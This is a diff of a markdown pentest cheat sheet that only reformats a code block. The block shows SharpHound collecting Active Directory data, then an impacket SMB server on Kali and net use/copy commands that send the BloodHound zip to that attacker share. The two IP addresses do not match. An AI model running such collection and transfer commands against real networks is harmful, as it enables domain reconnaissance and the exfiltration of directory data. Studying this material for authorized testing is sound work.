@@ -402,12 +402,12 @@ C:\Windows\Tasks\SharpHound.exe --CollectionMethods All
 
 * Transferring output to kali:
 
-```bash
+```console
 ## Kali:
-impacket-smbserver samba . -username kali -password kalii -smb2support
+    impacket-smbserver samba . -username kali -password kalii -smb2support
 ## Target:
-net use \\192.168.49.106\samba kalii /user:kali
-copy 20221018071247_BloodHound.zip \\10.10.14.2\\samba
+    net use \\192.168.49.106\samba kalii /user:kali
+    copy 20221018071247_BloodHound.zip \\10.10.14.2\\samba
 ```
 
 * Analyzing in BloodHound:
